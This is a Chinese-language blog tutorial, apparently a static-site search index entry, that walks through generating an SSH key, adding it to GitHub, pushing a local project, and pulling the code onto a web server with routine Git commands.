        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在日常开发中我们经常会遇到这样的需求：在本地开发项目同步到Github上，同时将服务器上的代码也做更新。倘若能把 <code>本地-Github-服务器</code> 这三个平台关联（如图），这样就能极大的提高我们的效率。</p><p><img src="https://s2.loli.net/2023/04/22/wOzFbcxL1WoHvga.png" alt=""></p><p>那么大体上的思路就只分两步了：</p><ol><li>将本地项目托管到Github</li><li>将Github上的代码同步到远程服务器端</li></ol><h1 id="本地项目托管到Github"><a href="#本地项目托管到Github" class="headerlink" title="本地项目托管到Github"></a>本地项目托管到Github</h1><p>先假设我们再本地的D盘目录下创建了一个<code>test</code>文件夹，里面放着我们的项目代码，接下来我们需要进行如下操作将其托管到Github。</p><h3 id="1-本地下载安装Git环境"><a href="#1-本地下载安装Git环境" class="headerlink" title="1. 本地下载安装Git环境"></a>1. 本地下载安装Git环境</h3><p>这一步不多做赘述，去Git官网下载Git的安装包就可以了，安装完成后打开<code>Git Bash</code>应用，输入指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -C &quot;yourEmail&quot;</span><br><span class="line">$ Generating public/private rsa key pair.</span><br><span class="line">$ Enter file in which to save the key (/c/Users/esunr/.ssh/id_rsa): </span><br><span class="line">$ Created directory &#x27;/c/Users/esunr/.ssh&#x27;.</span><br><span class="line">$ Enter passphrase (empty for no passphrase):</span><br><span class="line">$ Enter same passphrase again:</span><br><span class="line"></span><br><span class="line">$ git config --global user.name &quot;yourName&quot;</span><br><span class="line">$ git config --global user.email &quot;yourEmal&quot;</span><br></pre></td></tr></table></figure><p><code>yourName</code>和<code>yourEmal</code>分别对应你的Github用户名和邮箱</p><h3 id="2-添加开发机的SSH-Key"><a href="#2-添加开发机的SSH-Key" class="headerlink" title="2. 添加开发机的SSH Key"></a>2. 添加开发机的SSH Key</h3><p><code>SSH Key</code>即SSH公钥，只有我们把某台PC的SSH公钥添加到Github的设置中，我们的这台PC才能跟我们上传的项目进行同步和更改。</p><p>首先我们打开Git Bash，在命令中输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd ~/.ssh</span><br><span class="line">$ ls</span><br></pre></td></tr></table></figure><p>如果列出如下目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id_rsa  id_rsa.pub  known_hosts</span><br></pre></td></tr></table></figure><p>说明已存在SSH Key无需再生成，如果不存在则运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen</span><br></pre></td></tr></table></figure><p>生成<code>id_rsa.pub</code>文件后，我们使用命令查看密钥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat id_rsa.pub</span><br></pre></td></tr></table></figure><p>得到的密钥大概长这样</p><p><img src="https://s2.loli.net/2023/04/22/jHBbVcumG45eCtR.png" alt=""></p><p>我们将<code>id_ras.pub</code>文件中的所有文本都复制下来，打开Github，选择右上角头像-Settings-SSH and GPG keys，点击选项面板中的<code>New SSH Key</code>。</p><p><img src="https://s2.loli.net/2023/04/22/ADPX1pEoZJ43yCM.png" alt=""></p><p>将自己的SSH Key添加到选项中即可，之后我们可以运行测试是否连接到Github</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p>如果出现如下提示，则说名连接成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hi EsunR! You&#x27;ve successfully authenticated, but GitHub does not provide shell access.</span><br></pre></td></tr></table></figure><h3 id="3-在Github中创建空项目"><a href="#3-在Github中创建空项目" class="headerlink" title="3. 在Github中创建空项目"></a>3. 在Github中创建空项目</h3><p>我们点击右上角的“+”选择<code>New repository</code>创建一个新项目，要注意一点的是：</p><blockquote><p>新项目中除了题目和描述之外，不要点击任何选项，我们要的是一个完全空的项目仓库</p></blockquote><p><img src="https://s2.loli.net/2023/04/22/dy1zqZ3FUHxn857.png" alt=""></p><h3 id="4-上传本地项目代码到Github"><a href="#4-上传本地项目代码到Github" class="headerlink" title="4. 上传本地项目代码到Github"></a>4. 上传本地项目代码到Github</h3><p>我们点击<code>Create repository</code>之后，会出现一个提示，如下做讲解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// 这一步是跳转到本地的项目目录，我们可以替换为cd指令跳转，cd C:/test</span><br><span class="line">echo &quot;# test&quot; &gt;&gt; README.md</span><br><span class="line">// 初始化项目</span><br><span class="line">git init</span><br><span class="line">// 添加一个README.md文件（选择性）</span><br><span class="line">git add README.md</span><br><span class="line">// 托管更改</span><br><span class="line">git add . </span><br><span class="line">// 提交一次初始化更改</span><br><span class="line">git commit -m &quot;first commit&quot;</span><br><span class="line">// 将本地与Github做远程连接</span><br><span class="line">git remote add origin git@github.com:EsunR/test.git</span><br><span class="line">// 提交代码到主分支</span><br><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure><p>之后再刷新Github页面就发现代码提交完成了。</p><h1 id="Github代码同步到服务器"><a href="#Github代码同步到服务器" class="headerlink" title="Github代码同步到服务器"></a>Github代码同步到服务器</h1><blockquote><p>PS: 将代码下载到本地同理</p></blockquote><h3 id="1-服务器下载安装Git环境"><a href="#1-服务器下载安装Git环境" class="headerlink" title="1. 服务器下载安装Git环境"></a>1. 服务器下载安装Git环境</h3><p>与上文相同，只不过是服务器端就不需要用Git Bash了</p><h3 id="2-添加开发机的SSH-Key-1"><a href="#2-添加开发机的SSH-Key-1" class="headerlink" title="2. 添加开发机的SSH Key"></a>2. 添加开发机的SSH Key</h3><p>与上文相同</p><h3 id="4-同步项目代码到服务器（本地）"><a href="#4-同步项目代码到服务器（本地）" class="headerlink" title="4. 同步项目代码到服务器（本地）"></a>4. 同步项目代码到服务器（本地）</h3><p>首先在服务器或本地创建一个文件夹，作为项目的存放仓库，利用cd指令跳转到该文件夹下，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ cd /var/www/html</span><br><span class="line">$ mkdir test</span><br><span class="line">$ cd test</span><br></pre></td></tr></table></figure><p>初始化该目录为Git仓库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git init</span><br></pre></td></tr></table></figure><p>我们在Github中打开我们的项目，之后选择<code>Clone or download</code>，复制我们项目的SSH地址</p><p><img src="https://s2.loli.net/2023/04/22/VCdth546ielnUqx.png" alt=""></p><p>将仓库远程源连接到Github上的该项目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git remote add origin git@github.com:EsunR/test.git</span><br></pre></td></tr></table></figure><blockquote><p>PS: 如过手滑信息填写错误，使用清除指令 <code>$ git remote remove origin</code> 清除源</p></blockquote><p>使用<code>Pull</code>指令，从远程源的主分支更新代码到服务器（本地）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git pull origin master</span><br></pre></td></tr></table></figure><p>完成。</p>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
            <tag> Github </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
